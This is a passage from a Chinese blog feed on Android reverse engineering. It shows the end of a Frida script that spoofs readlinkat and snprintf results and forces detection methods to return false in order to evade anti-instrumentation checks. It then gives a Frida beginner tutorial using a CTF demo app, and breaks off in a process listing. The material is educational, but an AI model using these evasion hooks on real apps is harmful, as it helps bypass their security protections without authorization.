class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-keyword">var</span> func = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&#x27;b.a.a.b&#x27;</span>);<br>func.<span class="hljs-property">j</span>.<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;;<br>func.<span class="hljs-property">a</span>.<span class="hljs-title function_">overload</span>().<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;;<br>func.<span class="hljs-property">e</span>.<span class="hljs-title function_">overload</span>().<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;;<br><span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(<span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-string">&quot;libc.so&quot;</span>, <span class="hljs-string">&quot;readlinkat&quot;</span>), &#123;<br><span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">args</span>) &#123;<br><span class="hljs-variable language_">this</span>.<span class="hljs-property">readlinkat_addr</span> = args[<span class="hljs-number">1</span>];<br><span class="hljs-variable language_">this</span>.<span class="hljs-property">readlinkat_buf</span> = args[<span class="hljs-number">2</span>];<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;readlinkat =&gt;&quot;</span> + <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">readUtf8String</span>(args[<span class="hljs-number">1</span>]))<br>&#125;,<br><span class="hljs-attr">onLeave</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">retval</span>) &#123;<br><span class="hljs-comment">//console.log(&quot;readlinkat buf: &quot;+retval.toInt32() +&quot; :&quot;+ Memory.readUtf8String(this.readlinkat_buf));</span><br><span class="hljs-keyword">if</span>(retval.<span class="hljs-title function_">toInt32</span>() == <span class="hljs-number">14</span>)&#123;<br><span class="hljs-variable language_">this</span>.<span class="hljs-property">readlinkat_buf</span>.<span class="hljs-title function_">writeUtf8String</span>(<span class="hljs-string">&quot;anon_inode:[eventfd]&quot;</span>);<br>retval.<span class="hljs-title function_">replace</span>(<span class="hljs-number">20</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;readlinkat buf modifyd: &quot;</span>+retval.<span class="hljs-title function_">toInt32</span>() +<span class="hljs-string">&quot; :&quot;</span>+ <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">readUtf8String</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">readlinkat_buf</span>));<br>&#125;<br><span class="hljs-keyword">return</span> retval;<br>&#125;<br>&#125;);<br><span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(<span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-string">&quot;libc.so&quot;</span>, <span class="hljs-string">&quot;open&quot;</span>), &#123;<br><span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">args</span>) &#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;open =&gt;&quot;</span> + <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">readUtf8String</span>(args[<span class="hljs-number">0</span>]))<br>&#125;,<br><span class="hljs-attr">onLeave</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">retval</span>) &#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;open ret=&gt;&quot;</span> + retval.<span class="hljs-title function_">toInt32</span>());<br><span class="hljs-keyword">return</span> retval;<br>&#125;<br>&#125;);<br><span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(<span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-string">&quot;libc.so&quot;</span>, <span class="hljs-string">&quot;openat&quot;</span>), &#123;<br><span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">args</span>) &#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;openat =&gt;&quot;</span> + <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">readUtf8String</span>(args[<span class="hljs-number">0</span>]))<br>&#125;,<br><span class="hljs-attr">onLeave</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">retval</span>) &#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;openat ret=&gt;&quot;</span> + retval.<span class="hljs-title function_">toInt32</span>());<br><span class="hljs-keyword">return</span> retval;<br>&#125;<br>&#125;);<br><span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(<span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-string">&quot;libc.so&quot;</span>, <span class="hljs-string">&quot;faccessat&quot;</span>), &#123;<br><span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">args</span>) &#123;<br><span class="hljs-variable language_">this</span>.<span class="hljs-property">faccessat</span> = args[<span class="hljs-number">1</span>];<br>&#125;,<br><span class="hljs-attr">onLeave</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">retval</span>) &#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;faccessat =&gt;&quot;</span> + <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">readUtf8String</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">faccessat</span>))<br><span class="hljs-keyword">return</span> retval;<br>&#125;<br>&#125;);<br><span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(<span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-string">&quot;libc.so&quot;</span>, <span class="hljs-string">&quot;snprintf&quot;</span>), &#123;<br><span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">args</span>) &#123;<br><span class="hljs-variable language_">this</span>.<span class="hljs-property">snprintf_addr</span> = args[<span class="hljs-number">0</span>];<br>&#125;,<br><span class="hljs-attr">onLeave</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">retval</span>) &#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;snprintf =&gt;&quot;</span> + <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">readUtf8String</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">snprintf_addr</span>));<br><span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">writeUtf8String</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">snprintf_addr</span>, <span class="hljs-string">&quot;/proc/self/task/123/status&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;snprintf modified =&gt;&quot;</span> + <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">readUtf8String</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">snprintf_addr</span>));<br><span class="hljs-keyword">return</span> retval;<br>&#125;<br>&#125;);<br>&#125;);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>动态钩子工具Frida的入门学习</title>
    <link href="/blog/2023/12/01/%E5%8A%A8%E6%80%81%E9%92%A9%E5%AD%90%E5%B7%A5%E5%85%B7Frida%E7%9A%84%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/"/>
    <url>/blog/2023/12/01/%E5%8A%A8%E6%80%81%E9%92%A9%E5%AD%90%E5%B7%A5%E5%85%B7Frida%E7%9A%84%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p><strong>Frida是一款轻量级hook框架，可用于多平台上，例如Android、Windows、IOS、 GNU&#x2F;Linux等。Frida分为两部分，服务端运行在目标机上，通过注入进程的方式来实现劫持应用函数，另一部分运行在自己操作的主机上。Frida上层接口支持js、python、c等。</strong></p><p><img src="/images/image-20231202132129914.png"></p><span id="more"></span><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h3 id="Frida"><a href="#Frida" class="headerlink" title="Frida"></a>Frida</h3><p>Frida 是一个用于在运行时分析、修改和控制应用程序的动态插桩工具，主要用于逆向工程、安全研究和应用程序测试。Frida 提供了多平台支持，包括 Android、iOS、Windows、macOS 和 Linux。它的主要特点包括：</p><ol><li><strong>动态插桩：</strong> Frida 允许你在运行时动态地插入 JavaScript 代码到目标应用程序中。这意味着你可以在不重新编译或重新启动应用的情况下，直接与运行中的代码交互。</li><li><strong>多平台支持：</strong> Frida 提供了广泛的平台支持，使其可以应用于多种操作系统和设备，包括 Android、iOS、Windows、macOS 和 Linux。</li><li><strong>脚本编写：</strong> 使用 JavaScript 编写 Frida 脚本，这使得它易于学习和使用。你可以通过脚本来执行各种任务，如函数挂钩、内存操作、函数参数修改等。</li><li><strong>功能强大的 API：</strong> Frida 提供了强大的 API，使得你能够直接与目标应用程序进行交互。你可以访问和修改内存、调用函数、挂钩函数等。<a href="https://frida.re/docs/javascript-api/">JavaScript API | Frida • A world-class dynamic instrumentation toolkit</a></li><li><strong>应用场景：</strong> Frida 在安全研究和逆向工程中广泛应用，用于分析和修改应用程序的行为，破解加密算法，绕过安全机制等。它还可用于应用程序测试，以检查应用程序的安全性和漏洞。</li><li><strong>社区支持：</strong> Frida 拥有活跃的社区，提供文档、示例代码和支持论坛，方便用户学习和解决问题。</li></ol><p>使用 Frida 的基本步骤包括安装 Frida 工具、运行 Frida Server（在移动设备上）、编写 Frida 脚本并将其注入到目标应用程序中。这使得研究人员和安全专业人员能够在运行时动态地分析和修改应用程序的行为，以便更好地理解其内部机制，发现潜在的漏洞，并进行安全评估。</p><h3 id="动态插桩技术"><a href="#动态插桩技术" class="headerlink" title="动态插桩技术"></a>动态插桩技术</h3><p>使用动态二进制插桩有两种主要方式，其中第一个方式是最常见的，是在动态二进制系统的控制下从头到尾执行程序。当我们想要实现完整的系统模拟或仿真时，由于需要完全控制并进行代码覆盖，就要在动态二进制系统的控制下从头到尾执行程序。第二个方式就是动态二进制系统可以被附加到一个已经运行的程序中，且以完全相同的方式被调试器从正在运行的程序中附加或分离。如果我们想知道某个程序在特定时刻正在做什么，那么第二个方式就会非常有用。</p><p>此外，大多数动态二进制插桩框架都有三种执行模式：解释模式（ Interpretation mode）、探测模式（probe mode）和JIT模式（just-in-time mode）。JIT模式是最常见的实现方式，也是最常用的模式，在JIT模式下，原始二进制文件或可执行文件实际上从未被修改或执行过，此时二进制文件被视为数据，修改后的二进制文件副本将在新的内存区域中生成(但只针对二进制文件的执行部分，而不是整个二进制文件)，此时执行的就是这个修改后的文件副本。而在解释模式中，二进制文件也被视为数据，每条指令都被用作具有相应功能的替代指令的查找表(由用户实现) 。在探测模式中，二进制文件实际上是通过使用新指令来覆盖旧的指令，来达到修改目的的，不过这会导致运行开销增大，但在某些体系结构(如x86)中，该方式很好用。</p><p>无论采用哪种执行模式，一旦我们通过动态二进制插桩框架控制了程序的执行，就能够将插桩添加到执行程序中。我们可以在代码块之前和之后插入想要的代码，甚至也可以完全替换它们。</p><p><img src="/images/image-20231203141039153.png" alt="动态插桩执行过程"></p><h2 id="安装使用"><a href="#安装使用" class="headerlink" title="安装使用"></a>安装使用</h2><p><a href="https://frida.re/docs/installation/">Installation | Frida • A world-class dynamic instrumentation toolkit</a></p><h3 id="Android端"><a href="#Android端" class="headerlink" title="Android端"></a>Android端</h3><p>需要Root，本文直接使用的模拟器</p><p>下载对应Android版本的server版本<a href="https://github.com/frida/frida/releases">Releases · frida&#x2F;frida (github.com)</a>，具体架构可以使用<code>adb shell</code>连接到设备之后，使用<code>cat /proc/cpuinfo</code> 或者<code>uname -a</code>查看；或者直接使用<code>adb shell getprop ro.product.cpu.abi</code>查看</p><p>下载之后使用adb将文件上传至Android：<code>adb push frida-server /data/local/tmp/</code></p><p>然后使用<code>adb shell</code>连接到Android设备，打开<code>/data/local/tmp/</code>目录，将frida-server文件设置为可执行，使用<code>chmod 777 frida-server </code>即可，然后<code>./frida-server</code>即可执行服务</p><h3 id="桌面端"><a href="#桌面端" class="headerlink" title="桌面端"></a>桌面端</h3><p>安装Python3之后执行下面pip命令安装frida库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 安装 frida库 </span><br>pip install frida<br> <br><span class="hljs-comment"># 安装frida-tools工具</span><br>pip install frida-tools<br></code></pre></td></tr></table></figure><p>安装完成后可以使用<code>frida-ps -U</code>查看是否展示了任务列表，如果可以环境就配置完成了。</p><p>下面官方文档有很多相关的tools的介绍： </p><p><a href="https://frida.re/docs/frida-ps/">frida-ps | Frida • A world-class dynamic instrumentation toolkit</a></p><h3 id="Android相关frida脚本编写指南"><a href="#Android相关frida脚本编写指南" class="headerlink" title="Android相关frida脚本编写指南"></a>Android相关frida脚本编写指南</h3><p><a href="https://frida.re/docs/javascript-api/#java">JavaScript API | Frida • A world-class dynamic instrumentation toolkit</a></p><p><a href="https://frida.re/docs/examples/android/">Android | Frida • A world-class dynamic instrumentation toolkit</a></p><h2 id="一个简单的应用实例"><a href="#一个简单的应用实例" class="headerlink" title="一个简单的应用实例"></a>一个简单的应用实例</h2><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>CTF简单小demo的apk下载链接：<a href="https://pan.baidu.com/s/1eq9AGt8p_cG7fbRa4Pn8ig?pwd=elze">https://pan.baidu.com/s/1eq9AGt8p_cG7fbRa4Pn8ig?pwd=elze</a>  提取码：elze</p><p>Jadx仓库Github地址：<a href="https://github.com/skylot/jadx">skylot&#x2F;jadx: Dex to Java decompiler (github.com)</a></p><h3 id="APP分析"><a href="#APP分析" class="headerlink" title="APP分析"></a>APP分析</h3><p>在模拟器中安装APP，可以看到如下界面：</p><p><img src="/images/image-20231202142347114.png"></p><p>显然不想使用模拟点击507904次的方法去得到Flag，我们可以看一下逻辑。</p><p>小demo应用没有加壳处理，可以直接拖到Jadx中进行反编译，得到的主要的Java代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">package</span> com.ctf.test.ctf_100;<br><br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.os.Debug;<br><span class="hljs-keyword">import</span> android.support.v7.app.AppCompatActivity;<br><span class="hljs-keyword">import</span> android.view.View;<br><span class="hljs-keyword">import</span> android.widget.Button;<br><span class="hljs-keyword">import</span> android.widget.TextView;<br><span class="hljs-keyword">import</span> java.util.Random;<br><br><span class="hljs-comment">/* loaded from: classes.dex */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> has_gone_int;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> to_reach_int;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">native</span> String <span class="hljs-title function_">get_flag</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><br>    <span class="hljs-comment">/* JADX INFO: Access modifiers changed from: protected */</span><br>    <span class="hljs-meta">@Override</span> <span class="hljs-comment">// android.support.v7.app.AppCompatActivity, android.support.v4.app.FragmentActivity, android.support.v4.app.BaseFragmentActivityDonut, android.app.Activity</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>        setContentView(R.layout.activity_main);<br>        <span class="hljs-type">Button</span> <span class="hljs-variable">bt</span> <span class="hljs-operator">=</span> (Button) findViewById(R.id.button2);<br>        bt.setClickable(<span class="hljs-literal">false</span>);<br>        <span class="hljs-built_in">this</span>.has_gone_int = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">Random</span> <span class="hljs-variable">random</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>();<br>        <span class="hljs-built_in">this</span>.to_reach_int = random.nextInt();<br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.to_reach_int &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">this</span>.to_reach_int *= -<span class="hljs-number">1</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-number">5</span> &gt;= <span class="hljs-built_in">this</span>.to_reach_int) &#123;<br>                <span class="hljs-built_in">this</span>.to_reach_int = random.nextInt();<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-built_in">this</span>.to_reach_int %= <span class="hljs-number">32</span>;<br>                <span class="hljs-built_in">this</span>.to_reach_int *= <span class="hljs-number">16384</span>;<br>                <span class="hljs-type">TextView</span> <span class="hljs-variable">tv</span> <span class="hljs-operator">=</span> (TextView) findViewById(R.id.data_to_reach);<br>                tv.setText(<span class="hljs-string">&quot;&quot;</span> + <span class="hljs-built_in">this</span>.to_reach_int);<br>                <span class="hljs-type">TextView</span> <span class="hljs-variable">tv_result</span> <span class="hljs-operator">=</span> (TextView) findViewById(R.id.tvResult);<br>                tv_result.setText(<span class="hljs-string">&quot;&quot;</span>);<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Btn_up_onclick</span><span class="hljs-params">(View v)</span> &#123;<br>        <span class="hljs-built_in">this</span>.has_gone_int++;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span> + <span class="hljs-built_in">this</span>.has_gone_int;<br>        <span class="hljs-type">TextView</span> <span class="hljs-variable">tv</span> <span class="hljs-operator">=</span> (TextView) findViewById(R.id.data_has_gone);<br>        tv.setText(data);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.to_reach_int &lt;= <span class="hljs-built_in">this</span>.has_gone_int) &#123;<br>            <span class="hljs-type">Button</span> <span class="hljs-variable">bt</span> <span class="hljs-operator">=</span> (Button) findViewById(R.id.button2);<br>            bt.setClickable(<span class="hljs-literal">true</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">btn2_onclick</span><span class="hljs-params">(View v)</span> &#123;<br>        <span class="hljs-type">TextView</span> <span class="hljs-variable">tv_result</span> <span class="hljs-operator">=</span> (TextView) findViewById(R.id.tvResult);<br>        tv_result.setText(<span class="hljs-string">&quot;&#123;Flag:&quot;</span> + get_flag(<span class="hljs-built_in">this</span>.to_reach_int) + <span class="hljs-string">&quot;&#125;&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">if</span> (!Debug.isDebuggerConnected()) &#123;<br>            System.loadLibrary(<span class="hljs-string">&quot;ctf&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>逻辑很简单，步数是伪随机生成的，达到步数要求后按钮变为可点击状态，点击按钮调用<code>get_flag</code>函数即可得到flag。</p><h3 id="编写frida脚本"><a href="#编写frida脚本" class="headerlink" title="编写frida脚本"></a>编写frida脚本</h3><p>根据上面的分析，最直观的一个拿到flag的思路就是寻找到MainActivity的实例，然后调用本地实例方法<code>get_flag</code>即可直接绕过逻辑直接获取Flag。</p><p>编写脚本时需要确定attach的进程名，因此需要使用frida列出运行中的进程：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> frida<br><br>process = frida.get_usb_device(-<span class="hljs-number">1</span>).enumerate_processes()<br><span class="hljs-built_in">print</span>(process)<br></code></pre></td></tr></table></figure><p>结果如下，我们可以看到该应用进程的名字是<code>CTF_100</code>，pid&#x3D;2862</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">[</span>Process(pid=<span class="hljs-number">1</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;init&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1068</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;init&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1069</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;init&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1070</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;ueventd&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1427</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;logd&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1430</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;servicemanager&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1431</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;hwservicemanager&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1432</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;vndservicemanager&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1500</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;vold&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1550</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;netd&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1551</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;zygote64&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1552</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;zygote&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1553</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;android.hidl.allocator@1.0-service&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1554</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;healthd&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1555</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;android.hardware.audio@2.0-service&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1556</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;android.hardware.bluetooth@1.0-service.btlinux&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1558</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;android.hardware.cas@1.0-service&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1559</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;android.hardware.configstore@1.1-service&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1560</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;android.hardware.dumpstate@1.0-service&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1561</span><span class="hljs-punctuation">,</span> name=<span class="hljs-string">&quot;android.hardware.light@2.0-service&quot;</span><span class="hljs-punctuation">,</span> parameters=<span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span>)<span class="hljs-punctuation">,</span> Process(pid=<span class="hljs-number">1562</span><span class="hljs-punctuation">,</span> name=<span 